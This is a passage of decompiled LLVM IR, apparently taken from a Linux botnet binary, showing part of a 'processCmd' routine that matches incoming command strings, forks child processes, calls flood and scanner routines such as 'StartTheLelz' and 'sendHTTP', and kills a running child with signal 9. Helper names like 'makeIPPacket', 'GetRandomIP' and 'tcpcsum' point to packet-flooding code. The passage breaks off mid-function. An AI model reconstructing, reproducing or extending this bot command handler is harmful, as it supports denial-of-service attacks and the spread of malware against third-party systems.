  uselistorder i32 %v3_804bbf2, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i32 %v1_804bbc7, { 1, 0 }
  uselistorder i1 %v0_804bbae, { 1, 0 }
  uselistorder i32 %v6_804bbac, { 1, 0 }
  uselistorder i32 %v1_804bb74, { 1, 0 }
  uselistorder i1 %v0_804bb5b, { 1, 0 }
  uselistorder i32 %v6_804bb59, { 1, 0 }
  uselistorder i32 %v1_804bb1e, { 1, 0 }
  uselistorder i1 %v0_804bb05, { 1, 0 }
  uselistorder i32 %v6_804bb03, { 1, 0 }
  uselistorder i32 %v1_804bad4, { 1, 0 }
  uselistorder i1 %v0_804babb, { 1, 0 }
  uselistorder i32 %v6_804bab9, { 1, 0 }
  uselistorder i32 %v1_804ba90, { 1, 0 }
  uselistorder i1 %v0_804ba77, { 1, 0 }
  uselistorder i32 %v6_804ba75, { 1, 0 }
  uselistorder i32 %v4_804ba57, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10 }
  uselistorder i32 %stack_var_-160.130, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-156.131, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804bbd7, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804bbc4, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i32 %v1_804ba30, { 1, 0 }
  uselistorder i32 %v1_804ba24, { 1, 0 }
  uselistorder i32 %v1_804ba18, { 1, 0 }
  uselistorder i32 %v1_804ba0c, { 1, 0 }
  uselistorder i32 %v1_804ba00, { 1, 0 }
  uselistorder i8* %v2_804b9fd, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804b9e7, { 1, 0 }
  uselistorder i32 %v6_804b9e5, { 1, 0 }
  uselistorder i32 %v1_804b999, { 1, 0 }
  uselistorder i32 %v0_804b97b, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804b956, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_804b93e, { 14, 13, 12, 11, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 4, 22, 21, 20, 19, 27, 18, 17, 16, 15, 3, 2, 1, 0 }
  uselistorder i32 %v2_804b933, { 1, 0, 2 }
  uselistorder i32 %v2_804b914, { 1, 0 }
  uselistorder i32 %v1_804b83d, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-60, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 2, 1, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 33, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 28, 27, 29, 31, 30, 32, 64, 65, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 -24, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 -20, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bd93, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804bcb6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bc50, { 1, 0 }
  uselistorder label %dec_label_pc_804bbe8, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804ba57, { 1, 0 }
  uselistorder label %dec_label_pc_804b91b, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %dec_label_pc_804b852, { 1, 0 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp115 = call i32 @__decompiler_undefined_function_0()
  %tmp134 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bda1 = load i32, i32* @edi, align 4
  %v0_804bda2 = load i32, i32* @esi, align 4
  %v0_804bda3 = load i32, i32* @ebx, align 4
  store i32 %v0_804bda3, i32* %stack_var_-16, align 4
  %v5_804bda4 = icmp ult i32* %stack_var_-16, inttoptr (i32 268 to i32*)
  store i1 %v5_804bda4, i1* %cf.global-to-local, align 1
  %v15_804bda4 = ptrtoint i32* %stack_var_-284 to i32
  %v1_804bdad = inttoptr i32 %tmp134 to i32*
  %v2_804bdad = load i32, i32* %v1_804bdad, align 4
  store i1 false, i1* @df, align 1
  %v4_804bdca = inttoptr i32 %v2_804bdad to i8*
  store i32 %v2_804bdad, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80561a0.19 to i32), i32* @edi, align 4
  %v7_804bddc = call i32 @_strncmp(i8* %v4_804bdca, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80561a0.19, i32 0, i32 0), i32 5)
  %v8_804bddc = urem i32 %v7_804bddc, 2
  %v9_804bddc = icmp eq i32 %v8_804bddc, 0
  %v0_804bdde = load i1, i1* %cf.global-to-local, align 1
  %v2_804bdde = or i1 %v0_804bdde, %v9_804bddc
  %v3_804bdde = zext i1 %v2_804bdde to i32
  %v4_804bdde = load i32, i32* @edx, align 4
  %v5_804bdde = and i32 %v4_804bdde, -256
  %v6_804bdde = or i32 %v3_804bdde, %v5_804bdde
  %v7_804bdde = xor i32 %v6_804bdde, 1
  store i32 %v7_804bdde, i32* %edx.global-to-local, align 4
  %v1_804bde6 = trunc i32 %v7_804bdde to i8
  %v3_804bde6 = zext i1 %v0_804bdde to i8
  %v15_804bde6 = icmp eq i8 %v1_804bde6, %v3_804bde6
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bdef = icmp eq i1 %v15_804bde6, false
  br i1 %v1_804bdef, label %dec_label_pc_804be0c, label %dec_label_pc_804bdf1

dec_label_pc_804bdf1:                             ; preds = %entry
  %v0_804bdf1 = load i32, i32* @global_var_8059b00.18, align 256
  %v0_804bdf6 = load i32, i32* @esp, align 4
  %v5_804bdf6 = icmp ult i32 %v0_804bdf6, 8
  store i1 %v5_804bdf6, i1* %cf.global-to-local, align 1
  %v2_804bdff = call i32 @Rootsprintf(i32 %v0_804bdf1, i32 ptrtoint ([6 x i8]* @global_var_8056519.150 to i32))
  %v0_804be04 = load i32, i32* @esp, align 4
  %v2_804be04 = icmp ugt i32 %v0_804be04, -17
  store i1 %v2_804be04, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c90d

dec_label_pc_804be0c:                             ; preds = %entry
  %v2_804be0f = load i32, i32* %v1_804bdad, align 4
  %v4_804be2c = inttoptr i32 %v2_804be0f to i8*
  %v7_804be3e = call i32 @_strncmp(i8* %v4_804be2c, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805651f.151, i32 0, i32 0), i32 6)
  %v8_804be3e = urem i32 %v7_804be3e, 2
  %v9_804be3e = icmp eq i32 %v8_804be3e, 0
  %v0_804be40 = load i1, i1* %cf.global-to-local, align 1
  %v2_804be40 = or i1 %v0_804be40, %v9_804be3e
  %v3_804be40 = zext i1 %v2_804be40 to i32
  %v4_804be40 = load i32, i32* %edx.global-to-local, align 4
  %v5_804be40 = and i32 %v4_804be40, -256
  %v6_804be40 = or i32 %v3_804be40, %v5_804be40
  %v7_804be40 = xor i32 %v6_804be40, 1
  store i32 %v7_804be40, i32* %edx.global-to-local, align 4
  %v1_804be48 = trunc i32 %v7_804be40 to i8
  %v3_804be48 = zext i1 %v0_804be40 to i8
  %v15_804be48 = icmp eq i8 %v1_804be48, %v3_804be48
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be51 = icmp eq i1 %v15_804be48, false
  br i1 %v1_804be51, label %dec_label_pc_804bf86, label %dec_label_pc_804be57

dec_label_pc_804be57:                             ; preds = %dec_label_pc_804be0c
  %v1_804be5a = add i32 %tmp134, 4
  %v5_804be5a = icmp ugt i32 %tmp134, -5
  store i1 %v5_804be5a, i1* %cf.global-to-local, align 1
  %v1_804be5d = inttoptr i32 %v1_804be5a to i32*
  %v2_804be5d = load i32, i32* %v1_804be5d, align 4
  store i1 false, i1* @df, align 1
  %v4_804be7a = inttoptr i32 %v2_804be5d to i8*
  store i32 %v2_804be5d, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056525.152 to i32), i32* @edi, align 4
  %v7_804be8c = call i32 @_strncmp(i8* %v4_804be7a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056525.152, i32 0, i32 0), i32 4)
  %v8_804be8c = urem i32 %v7_804be8c, 2
  %v9_804be8c = icmp eq i32 %v8_804be8c, 0
  %v0_804be8e = load i1, i1* %cf.global-to-local, align 1
  %v2_804be8e = or i1 %v0_804be8e, %v9_804be8c
  %v3_804be8e = zext i1 %v2_804be8e to i32
  %v4_804be8e = load i32, i32* %edx.global-to-local, align 4
  %v5_804be8e = and i32 %v4_804be8e, -256
  %v6_804be8e = or i32 %v3_804be8e, %v5_804be8e
  %v7_804be8e = xor i32 %v6_804be8e, 1
  store i32 %v7_804be8e, i32* @edx, align 4
  %v1_804be96 = trunc i32 %v7_804be8e to i8
  %v3_804be96 = zext i1 %v0_804be8e to i8
  %v15_804be96 = icmp eq i8 %v1_804be96, %v3_804be96
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be9f = icmp eq i1 %v15_804be96, false
  br i1 %v1_804be9f, label %dec_label_pc_804bee1, label %dec_label_pc_804bea1

dec_label_pc_804bea1:                             ; preds = %dec_label_pc_804be57
  %v0_804bea1 = load i32, i32* @global_var_805fd90.153, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bea6 = icmp eq i32 %v0_804bea1, 0
  br i1 %v1_804bea6, label %dec_label_pc_804c90d, label %dec_label_pc_804beae

dec_label_pc_804beae:                             ; preds = %dec_label_pc_804bea1
  %v0_804beb3 = load i32, i32* @esp, align 4
  %v5_804beb3 = icmp ult i32 %v0_804beb3, 8
  store i1 %v5_804beb3, i1* %cf.global-to-local, align 1
  %v2_804beb9 = call i32 @kill(i32 %v0_804bea1, i32 9)
  %v0_804bec1 = load i32, i32* @global_var_8059b00.18, align 256
  %v5_804bec6 = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804bec6, i1* %cf.global-to-local, align 1
  %v2_804becf = call i32 @Rootsprintf(i32 %v0_804bec1, i32 ptrtoint ([14 x i8]* @global_var_8056529.154 to i32))
  %v0_804bed4 = load i32, i32* @esp, align 4
  %v2_804bed4 = icmp ugt i32 %v0_804bed4, -17
  store i1 %v2_804bed4, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_805fd90.153, align 16
  br label %dec_label_pc_804bee1

dec_label_pc_804bee1:                             ; preds = %dec_label_pc_804be57, %dec_label_pc_804beae
  store i1 %v5_804be5a, i1* %cf.global-to-local, align 1
  %v2_804bee7 = load i32, i32* %v1_804be5d, align 4
  store i1 false, i1* @df, align 1
  %v4_804bf04 = inttoptr i32 %v2_804bee7 to i8*
  %v7_804bf16 = call i32 @_strncmp(i8* %v4_804bf04, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056537.155, i32 0, i32 0), i32 3)
  %v8_804bf16 = urem i32 %v7_804bf16, 2
  %v9_804bf16 = icmp eq i32 %v8_804bf16, 0
  %v0_804bf18 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf18 = or i1 %v0_804bf18, %v9_804bf16
  %v3_804bf18 = zext i1 %v2_804bf18 to i32
  %v4_804bf18 = load i32, i32* @edx, align 4
  %v5_804bf18 = and i32 %v4_804bf18, -256
  %v6_804bf18 = or i32 %v3_804bf18, %v5_804bf18
  %v7_804bf18 = xor i32 %v6_804bf18, 1
  store i32 %v7_804bf18, i32* %edx.global-to-local, align 4
  %v1_804bf20 = trunc i32 %v7_804bf18 to i8
  %v3_804bf20 = zext i1 %v0_804bf18 to i8
  %v15_804bf20 = icmp eq i8 %v1_804bf20, %v3_804bf20
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf29 = icmp eq i1 %v15_804bf20, false
  br i1 %v1_804bf29, label %dec_label_pc_804bf86, label %dec_label_pc_804bf2b

dec_label_pc_804bf2b:                             ; preds = %dec_label_pc_804bee1
  %v0_804bf2b = load i32, i32* @global_var_805fd90.153, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf30 = icmp eq i32 %v0_804bf2b, 0
  %v1_804bf32 = icmp eq i1 %v1_804bf30, false
  br i1 %v1_804bf32, label %dec_label_pc_804c90d, label %dec_label_pc_804bf38

dec_label_pc_804bf38:                             ; preds = %dec_label_pc_804bf2b
  %v1_804bf38 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bf4e = icmp eq i32 %v1_804bf38, 0
  br i1 %v4_804bf4e, label %dec_label_pc_804bf6b, label %dec_label_pc_804bf54

dec_label_pc_804bf54:                             ; preds = %dec_label_pc_804bf38
  store i32 %v1_804bf38, i32* @global_var_805fd90.153, align 16
  br label %dec_label_pc_804c90d

dec_label_pc_804bf6b:                             ; preds = %dec_label_pc_804bf38
  %v0_804bf6b = load i32, i32* @esp, align 4
  %v5_804bf6b = icmp ult i32 %v0_804bf6b, 8
  store i1 %v5_804bf6b, i1* %cf.global-to-local, align 1
  %v2_804bf74 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v5_804bf7c = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804bf7c, i1* %cf.global-to-local, align 1
  %v1_804bf81 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804bf86:                             ; preds = %dec_label_pc_804bee1, %dec_label_pc_804be0c
  %v2_804bf89 = load i32, i32* %v1_804bdad, align 4
  store i1 false, i1* @df, align 1
  %v4_804bfa6 = inttoptr i32 %v2_804bf89 to i8*
  store i32 %v2_804bf89, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805653a.156 to i32), i32* @edi, align 4
  %v7_804bfb8 = call i32 @_strncmp(i8* %v4_804bfa6, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805653a.156, i32 0, i32 0), i32 5)
  %v8_804bfb8 = urem i32 %v7_804bfb8, 2
  %v9_804bfb8 = icmp eq i32 %v8_804bfb8, 0
  %v0_804bfba = load i1, i1* %cf.global-to-local, align 1
  %v2_804bfba = or i1 %v0_804bfba, %v9_804bfb8
  %v3_804bfba = zext i1 %v2_804bfba to i32
  %v4_804bfba = load i32, i32* %edx.global-to-local, align 4
  %v5_804bfba = and i32 %v4_804bfba, -256
  %v6_804bfba = or i32 %v3_804bfba, %v5_804bfba
  %v7_804bfba = xor i32 %v6_804bfba, 1
  store i32 %v7_804bfba, i32* @edx, align 4
  %v1_804bfc2 = trunc i32 %v7_804bfba to i8
  %v3_804bfc2 = zext i1 %v0_804bfba to i8
  %v4_804bfc2 = sub nsw i8 %v1_804bfc2, %v3_804bfc2
  %v15_804bfc2 = icmp eq i8 %v4_804bfc2, 0
  store i1 false, i1* @cf, align 1
  %v1_804bfcb = icmp eq i1 %v15_804bfc2, false
  br i1 %v1_804bfcb, label %dec_label_pc_804c0f7, label %dec_label_pc_804bfd1

dec_label_pc_804bfd1:                             ; preds = %dec_label_pc_804bf86
  %v2_804bfc6 = sext i8 %v4_804bfc2 to i32
  %v9_804bfd1 = icmp ult i32 %tmp115, 5
  store i1 %v9_804bfd1, i1* %cf.global-to-local, align 1
  %v7_804bfd5 = icmp sgt i32 %tmp115, 5
  br i1 %v7_804bfd5, label %dec_label_pc_804bfdb, label %dec_label_pc_804c90d

dec_label_pc_804bfdb:                             ; preds = %dec_label_pc_804bfd1
  %v1_804bfde = add i32 %tmp134, 12
  %v1_804bfe1 = inttoptr i32 %v1_804bfde to i32*
  %v2_804bfe1 = load i32, i32* %v1_804bfe1, align 4
  %v0_804bfe3 = load i32, i32* @esp, align 4
  %v5_804bfe3 = icmp ult i32 %v0_804bfe3, 12
  store i1 %v5_804bfe3, i1* %cf.global-to-local, align 1
  %v1_804bfe7 = call i32 @atol(i32 %v2_804bfe1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp149 = icmp slt i32 %v1_804bfe7, 1
  br i1 %tmp149, label %dec_label_pc_804c90d, label %dec_label_pc_804bff7

dec_label_pc_804bff7:                             ; preds = %dec_label_pc_804bfdb
  %v1_804bffa = add i32 %tmp134, 20
  %v1_804bffd = inttoptr i32 %v1_804bffa to i32*
  %v2_804bffd = load i32, i32* %v1_804bffd, align 4
  %v5_804bfff = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804bfff, i1* %cf.global-to-local, align 1
  %v1_804c003 = call i32 @atol(i32 %v2_804bffd)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v1_804c003, 1
  %tmp151 = icmp eq i1 %tmp150, false
  br i1 %tmp151, label %dec_label_pc_804c014, label %dec_label_pc_804c90d

dec_label_pc_804c014:                             ; preds = %dec_label_pc_804bff7
  %v0_804c014 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c019 = icmp eq i32 %v0_804c014, 0
  %v1_804c01b = icmp eq i1 %v1_804c019, false
  br i1 %v1_804c01b, label %dec_label_pc_804c90d, label %dec_label_pc_804c021

dec_label_pc_804c021:                             ; preds = %dec_label_pc_804c014
  %v2_804c027 = load i32, i32* %v1_804bffd, align 4
  %v0_804c029 = load i32, i32* @esp, align 4
  %v5_804c029 = icmp ult i32 %v0_804c029, 12
  store i1 %v5_804c029, i1* %cf.global-to-local, align 1
  %v1_804c02d = call i32 @atol(i32 %v2_804c027)
  store i32 %v1_804c02d, i32* @esi, align 4
  %v2_804c03d = load i32, i32* %v1_804bfe1, align 4
  store i1 %v5_804bfff, i1* %cf.global-to-local, align 1
  %v1_804c043 = call i32 @atol(i32 %v2_804c03d)
  store i32 %v1_804c043, i32* %edx.global-to-local, align 4
  %v1_804c050 = add i32 %tmp134, 8
  %v1_804c053 = inttoptr i32 %v1_804c050 to i32*
  %v1_804c058 = add i32 %tmp134, 4
  %v1_804c05b = inttoptr i32 %v1_804c058 to i32*
  %v0_804c05d = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804c05d, i32* @ebx, align 4
  %v5_804c063 = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804c063, i1* %cf.global-to-local, align 1
  %v3_804c070 = call i32 @Rootsprintf(i32 %v0_804c05d, i32 ptrtoint ([38 x i8]* @global_var_8056540.157 to i32))
  %v1_804c07b = add i32 %tmp134, 24
  %v1_804c07e = inttoptr i32 %v1_804c07b to i32*
  %v2_804c07e = load i32, i32* %v1_804c07e, align 4
  store i1 %v5_804bfff, i1* %cf.global-to-local, align 1
  %v1_804c084 = call i32 @atol(i32 %v2_804c07e)
  store i32 %v1_804c084, i32* @ebx, align 4
  %v2_804c094 = load i32, i32* %v1_804bffd, align 4
  store i1 %v5_804bfff, i1* %cf.global-to-local, align 1
  %v1_804c09a = call i32 @atol(i32 %v2_804c094)
  store i32 %v1_804c09a, i32* @esi, align 4
  %v1_804c0a7 = add i32 %tmp134, 16
  %v1_804c0aa = inttoptr i32 %v1_804c0a7 to i32*
  %v2_804c0aa = load i32, i32* %v1_804c0aa, align 4
  store i32 %v2_804c0aa, i32* @edi, align 4
  %v2_804c0b4 = load i32, i32* %v1_804bfe1, align 4
  store i1 %v5_804bfff, i1* %cf.global-to-local, align 1
  %v1_804c0ba = call i32 @atol(i32 %v2_804c0b4)
  %v2_804c0d0 = load i32, i32* %v1_804c053, align 4
  store i32 %v2_804c0d0, i32* %edx.global-to-local, align 4
  %v2_804c0da = load i32, i32* %v1_804c05b, align 4
  store i1 %v5_804c063, i1* %cf.global-to-local, align 1
  %v0_804c0df = load i32, i32* @ebx, align 4
  %v0_804c0e0 = load i32, i32* @esi, align 4
  %v0_804c0e1 = load i32, i32* @edi, align 4
  %v7_804c0e5 = trunc i32 %v1_804c0ba to i16
  %v8_804c0e5 = call i32 @sendHTTP(i32 %v2_804c0da, i32 %v2_804c0d0, i16 %v7_804c0e5, i32 %v0_804c0e1, i32 %v0_804c0e0, i32 %v0_804c0df)
  store i32 %v8_804c0e5, i32* @eax, align 4
  store i1 %v5_804bfff, i1* %cf.global-to-local, align 1
  %v1_804c0f2 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804c0f7

dec_label_pc_804c0f7:                             ; preds = %dec_label_pc_804bf86, %dec_label_pc_804c021
  %v2_804c0fa = load i32, i32* %v1_804bdad, align 4
  store i1 false, i1* @df, align 1
  %v4_804c117 = inttoptr i32 %v2_804c0fa to i8*
  store i32 %v2_804c0fa, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056566.158 to i32), i32* @edi, align 4
  %v7_804c129 = call i32 @_strncmp(i8* %v4_804c117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056566.158, i32 0, i32 0), i32 4)
  %v8_804c129 = urem i32 %v7_804c129, 2
  %v9_804c129 = icmp eq i32 %v8_804c129, 0
  %v0_804c12b = load i1, i1* @cf, align 1
  %v2_804c12b = or i1 %v0_804c12b, %v9_804c129
  %v3_804c12b = zext i1 %v2_804c12b to i32
  %v4_804c12b = load i32, i32* @edx, align 4
  %v5_804c12b = and i32 %v4_804c12b, -256
  %v6_804c12b = or i32 %v3_804c12b, %v5_804c12b
  %v7_804c12b = xor i32 %v6_804c12b, 1
  store i32 %v7_804c12b, i32* %edx.global-to-local, align 4
  %v1_804c133 = trunc i32 %v7_804c12b to i8
  %v3_804c133 = zext i1 %v0_804c12b to i8
  %v15_804c133 = icmp eq i8 %v1_804c133, %v3_804c133
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c13c = icmp eq i1 %v15_804c133, false
  br i1 %v1_804c13c, label %dec_label_pc_804c402, label %dec_label_pc_804c142

dec_label_pc_804c142:                             ; preds = %dec_label_pc_804c0f7
  %v9_804c142 = icmp ult i32 %tmp115, 5
  store i1 %v9_804c142, i1* %cf.global-to-local, align 1
  %v7_804c146 = icmp sgt i32 %tmp115, 5
  br i1 %v7_804c146, label %dec_label_pc_804c14c, label %dec_label_pc_804c142.dec_label_pc_804c229_crit_edge

dec_label_pc_804c142.dec_label_pc_804c229_crit_edge: ; preds = %dec_label_pc_804c142
  %v0_804c22e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c229

dec_label_pc_804c14c:                             ; preds = %dec_label_pc_804c142
  %v1_804c14f = add i32 %tmp134, 12
  %v1_804c152 = inttoptr i32 %v1_804c14f to i32*
  %v2_804c152 = load i32, i32* %v1_804c152, align 4
  %v0_804c154 = load i32, i32* @esp, align 4
  %v5_804c154 = icmp ult i32 %v0_804c154, 12
  store i1 %v5_804c154, i1* %cf.global-to-local, align 1
  %v1_804c158 = call i32 @atol(i32 %v2_804c152)
  %v5_804c160 = icmp ne i32 %v1_804c158, -1
  store i1 %v5_804c160, i1* %cf.global-to-local, align 1
  %v10_804c160 = icmp eq i32 %v1_804c158, -1
  br i1 %v10_804c160, label %dec_label_pc_804c229, label %dec_label_pc_804c169

dec_label_pc_804c169:                             ; preds = %dec_label_pc_804c14c
  %v1_804c16c = add i32 %tmp134, 8
  %v1_804c16f = inttoptr i32 %v1_804c16c to i32*
  %v2_804c16f = load i32, i32* %v1_804c16f, align 4
  %v5_804c171 = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c175 = call i32 @atol(i32 %v2_804c16f)
  %v5_804c17d = icmp ne i32 %v1_804c175, -1
  store i1 %v5_804c17d, i1* %cf.global-to-local, align 1
  %v10_804c17d = icmp eq i32 %v1_804c175, -1
  br i1 %v10_804c17d, label %dec_label_pc_804c229, label %dec_label_pc_804c186

dec_label_pc_804c186:                             ; preds = %dec_label_pc_804c169
  %v1_804c189 = add i32 %tmp134, 16
  %v1_804c18c = inttoptr i32 %v1_804c189 to i32*
  %v2_804c18c = load i32, i32* %v1_804c18c, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c192 = call i32 @atol(i32 %v2_804c18c)
  %v5_804c19a = icmp ne i32 %v1_804c192, -1
  store i1 %v5_804c19a, i1* %cf.global-to-local, align 1
  %v10_804c19a = icmp eq i32 %v1_804c192, -1
  br i1 %v10_804c19a, label %dec_label_pc_804c229, label %dec_label_pc_804c1a3

dec_label_pc_804c1a3:                             ; preds = %dec_label_pc_804c186
  %v1_804c1a6 = add i32 %tmp134, 20
  %v1_804c1a9 = inttoptr i32 %v1_804c1a6 to i32*
  %v2_804c1a9 = load i32, i32* %v1_804c1a9, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c1af = call i32 @atol(i32 %v2_804c1a9)
  %v5_804c1b7 = icmp ne i32 %v1_804c1af, -1
  store i1 %v5_804c1b7, i1* %cf.global-to-local, align 1
  %v10_804c1b7 = icmp eq i32 %v1_804c1af, -1
  br i1 %v10_804c1b7, label %dec_label_pc_804c229, label %dec_label_pc_804c1bc

dec_label_pc_804c1bc:                             ; preds = %dec_label_pc_804c1a3
  %v2_804c1c2 = load i32, i32* %v1_804c1a9, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c1c8 = call i32 @atol(i32 %v2_804c1c2)
  %v1_804c1d0 = add i32 %v1_804c1c8, -65536
  %v2_804c1d0 = icmp ult i32 %v1_804c1c8, 65536
  %v3_804c1d0 = sub i32 65535, %v1_804c1c8
  %v4_804c1d0 = and i32 %v3_804c1d0, %v1_804c1c8
  %v5_804c1d0 = icmp slt i32 %v4_804c1d0, 0
  store i1 %v2_804c1d0, i1* %cf.global-to-local, align 1
  %v6_804c1d0 = icmp eq i32 %v1_804c1d0, 0
  %v7_804c1d0 = icmp slt i32 %v1_804c1d0, 0
  %v3_804c1d5 = icmp eq i1 %v7_804c1d0, %v5_804c1d0
  %v4_804c1d5 = icmp eq i1 %v6_804c1d0, false
  %v5_804c1d5 = and i1 %v4_804c1d5, %v3_804c1d5
  br i1 %v5_804c1d5, label %dec_label_pc_804c229, label %dec_label_pc_804c1d7

dec_label_pc_804c1d7:                             ; preds = %dec_label_pc_804c1bc
  %v2_804c1dd = load i32, i32* %v1_804c1a9, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c1e3 = call i32 @atol(i32 %v2_804c1dd)
  %v1_804c1eb = add i32 %v1_804c1e3, -65500
  %v5_804c1eb = icmp ult i32 %v1_804c1e3, 65500
  %v6_804c1eb = sub i32 65499, %v1_804c1e3
  %v7_804c1eb = and i32 %v6_804c1eb, %v1_804c1e3
  %v8_804c1eb = icmp slt i32 %v7_804c1eb, 0
  store i1 %v5_804c1eb, i1* %cf.global-to-local, align 1
  %v9_804c1eb = icmp eq i32 %v1_804c1eb, 0
  %v10_804c1eb = icmp slt i32 %v1_804c1eb, 0
  %v3_804c1f0 = icmp eq i1 %v10_804c1eb, %v8_804c1eb
  %v4_804c1f0 = icmp eq i1 %v9_804c1eb, false
  %v5_804c1f0 = and i1 %v4_804c1f0, %v3_804c1f0
  br i1 %v5_804c1f0, label %dec_label_pc_804c229, label %dec_label_pc_804c1f2

dec_label_pc_804c1f2:                             ; preds = %dec_label_pc_804c1d7
  %v2_804c1f8 = load i32, i32* %v1_804c18c, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c1fe = call i32 @atol(i32 %v2_804c1f8)
  %v1_804c206 = add i32 %v1_804c1fe, -32
  %v2_804c206 = icmp ult i32 %v1_804c1fe, 32
  %v3_804c206 = sub i32 31, %v1_804c1fe
  %v4_804c206 = and i32 %v3_804c206, %v1_804c1fe
  %v5_804c206 = icmp slt i32 %v4_804c206, 0
  store i1 %v2_804c206, i1* %cf.global-to-local, align 1
  %v6_804c206 = icmp eq i32 %v1_804c206, 0
  %v7_804c206 = icmp slt i32 %v1_804c206, 0
  %v3_804c209 = icmp eq i1 %v7_804c206, %v5_804c206
  %v4_804c209 = icmp eq i1 %v6_804c206, false
  %v5_804c209 = and i1 %v4_804c209, %v3_804c209
